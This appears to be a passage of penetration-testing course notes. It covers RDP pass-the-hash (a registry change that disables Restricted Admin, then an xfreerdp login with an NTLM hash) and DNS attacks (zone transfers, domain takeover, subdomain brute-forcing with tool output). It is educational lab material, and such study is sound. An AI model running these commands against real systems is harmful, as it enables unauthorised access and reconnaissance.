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Fi80cmXeb722fcfC7zy5ZvLWfJlmgSobTC3zX+yPnRcfWN8Uzmz30P33X2UZ74YlP/c3UKAAAECBAgQOGmBqy7cc//489mTzl36BAgQIECAAAECixLwWHxRzakyBAgQIECAAIHDCgguD+svdwIECBAgQIDAogQEl4tqTpUhQIAAAQIECBxWQHB5WH+5EyBAgAABAgQWJSC4XFRzqgwBAgQIECBA4LACgsvD+sudAAECBAgQILAoAcHloppTZQgQIECAAAEChxUQXB7WX+4ECBAgQIAAgUUJCC4X1ZwqQ4AAAQIECBA4rIDg8rD+cidAgAABAgQILEpAcLmo5lQZAgQIECBAgMBhBQSXh/WXOwECBAgQIEBgUQKCy0U1p8oQIECAAAECBA4rILg8rL/cCRAgQIAAAQKLEhBcLqo5VYYAAQIECBAgcFgBweVh/eVOgAABAgQIEFiUgOByUc2pMgQIECBAgACBwwoILg/rL3cCBAgQIECAwKIEBJeLak6VIUCAAAECBAgcVkBweVh/uRMgQIAAAQIEFiUguFxUc6oMAQIECBAgQOCwAoLLw/rLnQABAgQIECCwKAHB5aKaU2UIECBAgAABAocVEFwe1l/uBAgQIECAAIFFCQguF9WcKkOAAAECBAgQOKyA4PKw/nInQIAAAQIECCxKQHC5qOZUGQIECBAgQIDAYQUEl4f1lzsBAgQIECBAYFECgstFNafKECBAgAABAgQOKyC4PKy/3AkQIECAAAECixIQXC6qOVWGAAECBAgQIHBYAcHlYf3lToAAAQIECBBYlIDgclHNqTIECBAgQIAAgcMKCC4P6y93AgQIECBAgMCiBASXi2pOlSFAgAABAgQIHFZAcHlYf7kTIECAAAECBBYlILhcVHOqDAECBAgQIEDgsAKCy8P6y50AAQIECBAgsCgBweWimlNlCBAgQIAAAQKHFRBcHtZf7gQIECBAgACBRQkILhfVnCpDgAABAgQIEDisgODysP5yJ0CAAAECBAgsSkBwuajmVBkCBAgQIECAwGEFBJeH9Zc7AQIECBAgQGBRAoLLRTWnyhAgQIAAAQIEDisguDysv9wJECBAgAABAosSEFwuqjlVhgABAgQIECBwWAHB5WH95U6AAAECBAgQWJSA4HJRzakyBAgQIECAAIHDCgguD+svdwIECBAgQIDAogQEl4tqTpUhQIAAAQIECBxWQHB5WH+5EyBAgAABAgQWJSC4XFRzqgwBAgQIECBA4LACgsvD+sudAAECBAgQILAoAcHloppTZQgQIECAAAEChxUQXB7WX+4ECBAgQIAAgUUJ/MKiarNjZX7w5Q/teITdlyBwy/u+sIRqqAMBAgQIEDiTAmYuz2SzKBQBAgQIECBA4HwKXNEzl9Vk1/39Xz6frafUOwk8+5ff3Gl/OxMgQIAAAQK7CwguL5nd/k/+9e56jjg3Ao/+0e+dm7IqKAECBAgQOM8CHouf59ZTdgIECBAgQIDAGRMQXJ6xBlEcAgQIECBAgMB5FhBcnufWU3YCBAgQIECAwBkTEFyesQZRHAIECBAgQIDAeRYQXJ7n1lN2AgQIECBAgMAZExBcnrEGURwCBAgQIECAwHkWEFye59ZTdgIECBAgQIDAGRMQXJ6xBlEcAgQIECBAgMB5FhBcnufWU3YCBAgQIECAwBkTEFyesQZRHAIECBAgQIDAeRbw84/nufU2lP1z/+JXVheuv/bYXv/wtx869vnDd795decvvnF19797aX3W3XXHG1ffefyp1X1fenRDLjYTIECAAAECBF4SEFwutDc89O/vXv30+edXbTCZoPF/fPLu1X/+2ndX/+1Pnxis+Ztuum4dWD787R+uPv/Q9wb3sZIAAQIECBAgMCbgsfiYzDlenxnLBJb3/oevH6tFgsUEjb/5rltHa/cf/+k71jOWAstRIhsIECBAgACBCQHB5QTOed2UR+Ff+ebwzGSCxqsvzlf/41+5+WXVe+Df3rl6/OnnPAp/mYwVBAgQIECAwLYCgsttpc7JfhU0jj32TjX+78+eX731Ddcdq1FmO7N85D/96TmpqWISIECAAAECZ1FAcHkWW+Uyy/TC/9stgcxkTs127paavQkQIECAAIErWUBwucDWT7C4y5JgNO9i/vN337rKF3osBAgQIECAAIF9BQSX+8qd0eN++H+eW5ds6J3KKvLffeU1q+/86NljNci7mHnfMl/osRAgQIAAAQIE9hUQXO4rd0aP+/6Tz66DxF//5Zd/YSdF/sT7b19lpnLoncy8b5n3MfPfGFkIECBAgAABAvsICC73UTvjxyRIzOxkvv3dLgks33rhhtW/+eI3RmuQ/74oj9XrCz6jO9pAgAABAgQIEBgQEFwOoCxhVf3n6flP0+vPW26+Yf2fqmd2c2r5l//lG+sv+JjBnFKyjQABAgQIEBgS2PGrH0NJWHdWBfr/RH2onHnXsv8P0xN89j8TOXSsdQQIECBAgACBXsDMZS/iMwECBAgQIECAwN4Cgsu96RxIgAABAgQIECDQCwguexGfCRAgQIAAAQIE9hYQXO5N50ACBAgQIECAAIFeQHDZi/hMgAABAgQIECCwt4Dgcm86BxIgQIAAAQIECPQCgstexGcCBAgQIECAAIG9BQSXe9M5kAABAgQIECBAoBcQXPYiPhMgQIAAAQIECOwtILjcm86BBAgQIECAAAECvYCff7wk8ugf/V5v4zMBAgQIECBAgMCOAoLLi2DP/uU3d2SzOwECBAgQIECAwJCAx+JDKtYRIECAAAECBAjsJXDVhXvu//leRzqIAAECBAgQIECAQCdg5lKXIECAAAECBAgQmE1AcDkbpYQIECBAgAABAgQEl/oAAQIECBAgQIDAbAKCy9koJUSAAAECBAgQICC41AcIECBAgAABAgRmExBczkYpIQIECBAgQIAAAcGlPkCAAAECBAgQIDCbgOByNkoJESBAgAABAgQICC71AQIECBAgQIAAgdkEBJezUUqIAAECBAgQIEBAcKkPECBAgAABAgQIzCYguJyNUkIECBAgQIAAAQKCS32AAAECBAgQIEBgNgHB5WyUEiJAgAABAgQIEBBc6gMECBAgQIAAAQKzCQguZ6OUEAECBAgQIECAgOBSHyBAgAABAgQIEJhNQHA5G6WECBAgQIAAAQIEBJf6AAECBAgQIECAwGwCgsvZKCVEgAABAgQIECAguNQHCBAgQIAAAQIEZhMQXM5GKSECBAgQIECAAAHBpT5AgAABAgQIECAwm4DgcjZKCREgQIAAAQIECAgu9QECBAgQIECAAIHZBASXs1FKiAABAgQIECBAQHCpDxAgQIAAAQIECMwmILicjVJCBAgQIECAAAECgkt9gAABAgQIECBAYDYBweVslBIiQIAAAQIECBAQXOoDBAgQIECAAAECswkILmejlBABAgQIECBAgIDgUh8gQIAAAQIECBCYTUBwORulhAgQIECAAAECBASX+gABAgQIECBAgMBsAoLL2SglRIAAAQIECBAgILjUBwgQIECAAAECBGYTEFzORikhAgQIECBAgAABwaU+QIAAAQIECBAgMJuA4HI2SgkRIECAAAECBAgILvUBAgQIECBAgACB2QQEl7NRSogAAQIECBAgQEBwqQ8QIECAAAECBAjMJiC4nI1SQgQIECBAgAABAoJLfYAAAQIECBAgQGA2AcHlbJQSIkCAAAECBAgQEFzqAwQIECBAgAABArMJCC5no5QQAQIECBAgQICA4FIfIECAAAECBAgQmE1AcDkbpYQIECBAgAABAgQEl/oAAQIECBAgQIDAbAKCy9koJUSAAAECBAgQICC41AcIECBAgAABAgRmExBczkYpIQIECBAgQIAAAcGlPkCAAAECBAgQIDCbwP8HaJesmkZdrooAAAAASUVORK5CYII=)

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:

```cmd-session
C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```shell-session
# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

<SNIP>
```

The module then covered bluekeep.

# Attacking DNS

The [Domain Name System](https://www.cloudflare.com/learning/dns/what-is-dns/) (`DNS`) translates domain names (e.g., hackthebox.com) to the numerical IP addresses (e.g., 104.17.42.72). DNS is mostly `UDP/53`, but DNS will rely on `TCP/53` more heavily as time progresses.

## DNS Zone Transfer

DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server.

```shell-session
 #dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
;; global options: +cmd
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN      AAAA    ::1
inlanefrieght.htb.         604800  IN      NS      localhost.
inlanefrieght.htb.         604800  IN      A       10.129.110.22
admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.110.213#53(10.129.110.213)
;; WHEN: Mon Oct 11 17:20:13 EDT 2020
;; XFR size: 8 records (messages 1, bytes 289)
```

Tools like [Fierce](https://github.com/mschwager/fierce) can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer:

```shell-session
# fierce --domain zonetransfer.me

NS: nsztm2.digi.ninja. nsztm1.digi.ninja.
SOA: nsztm1.digi.ninja. (81.4.108.41)
Zone: success
{<DNS name @>: '@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 '
               '172800 900 1209600 3600\n'
               '@ 300 IN HINFO "Casio fx-700G" "Windows XP"\n'
               '@ 301 IN TXT '
               '"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"\n'
               '@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM.\n'
               '@ 7200 IN A 5.196.105.14\n'
               '@ 7200 IN NS nsztm1.digi.ninja.\n'
               '@ 7200 IN NS nsztm2.digi.ninja.',
 <DNS name _acme-challenge>: '_acme-challenge 301 IN TXT '
                             '"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI"',
 <DNS name _sip._tcp>: '_sip._tcp 14000 IN SRV 0 0 5060 www',
 <DNS name 14.105.196.5.IN-ADDR.ARPA>: '14.105.196.5.IN-ADDR.ARPA 7200 IN PTR '
                                       'www',
 <DNS name asfdbauthdns>: 'asfdbauthdns 7900 IN AFSDB 1 asfdbbox',
 <DNS name asfdbbox>: 'asfdbbox 7200 IN A 127.0.0.1',
 <DNS name asfdbvolume>: 'asfdbvolume 7800 IN AFSDB 1 asfdbbox',
 <DNS name canberra-office>: 'canberra-office 7200 IN A 202.14.81.230',
 <DNS name cmdexec>: 'cmdexec 300 IN TXT "; ls"',
 <DNS name contact>: 'contact 2592000 IN TXT "Remember to call or email Pippa '
                     'on +44 123 4567890 or pippa@zonetransfer.me when making '
                     'DNS changes"',
 <DNS name dc-office>: 'dc-office 7200 IN A 143.228.181.132',
 <DNS name deadbeef>: 'deadbeef 7201 IN AAAA dead:beaf::',
 <DNS name dr>: 'dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m',
 <DNS name DZC>: 'DZC 7200 IN TXT "AbCdEfG"',
 <DNS name email>: 'email 2222 IN NAPTR 1 1 "P" "E2U+email" "" '
                   'email.zonetransfer.me\n'
                   'email 7200 IN A 74.125.206.26',
 <DNS name Hello>: 'Hello 7200 IN TXT "Hi to Josh and all his class"',
 <DNS name home>: 'home 7200 IN A 127.0.0.1',
 <DNS name Info>: 'Info 7200 IN TXT "ZoneTransfer.me service provided by Robin '
                  'Wood - robin@digi.ninja. See '
                  'http://digi.ninja/projects/zonetransferme.php for more '
                  'information."',
 <DNS name internal>: 'internal 300 IN NS intns1\ninternal 300 IN NS intns2',
 <DNS name intns1>: 'intns1 300 IN A 81.4.108.41',
 <DNS name intns2>: 'intns2 300 IN A 167.88.42.94',
 <DNS name office>: 'office 7200 IN A 4.23.39.254',
 <DNS name ipv6actnow.org>: 'ipv6actnow.org 7200 IN AAAA '
                            '2001:67c:2e8:11::c100:1332',
...SNIP...
```

## Domain Takeover & Subdomain Enumeration

`Domain takeover` is registering a non-existent domain name to gain control over another domain.

```shell-session
sub.target.com.   60   IN   CNAME   anotherdomain.com
```

The domain name (e.g., `sub.target.com`) uses a CNAME record to another domain (e.g., `anotherdomain.com`). Suppose the `anotherdomain.com` expires and is available for anyone to claim the domain since the `target.com`'s DNS server has the `CNAME` record. In that case, anyone who registers `anotherdomain.com` will have complete control over `sub.target.com` until the DNS record is updated.

## Subdomain Enumeration

We can use [Subfinder](https://github.com/projectdiscovery/subfinder). This tool can scrape subdomains from open sources like [DNSdumpster](https://dnsdumpster.com/). Other tools like [Sublist3r](https://github.com/aboul3la/Sublist3r) can also be used to brute-force subdomains by supplying a pre-generated wordlist:

```shell-session
# ./subfinder -d inlanefreight.com -v       
                                                                       
        _     __ _         _                                           
____  _| |__ / _(_)_ _  __| |___ _ _          
(_-< || | '_ \  _| | ' \/ _  / -_) '_|                 
/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
                projectdiscovery.io                    
                                                                       
[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[WRN] By using subfinder, you also agree to the terms of the APIs used. 
                                   
[INF] Enumerating subdomains for inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
...snip...
[bufferover] Source took 2.193235338s for enumeration
ns2.inlanefreight.com
www.inlanefreight.com
ns1.inlanefreight.com
support.inlanefreight.com
[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
```

An excellent alternative is a tool called [Subbrute](https://github.com/TheRook/subbrute). This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.

```shell-session
$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
$ cd subbrute
$ echo "ns1.inlanefreight.com" > ./resolvers.txt
$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt

Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.com
ns2.inlanefreight.com
www.inlanefreight.com
ms1.inlanefreight.com
support.inlanefreight.com

<SNIP>
```

## DNS Spoofing

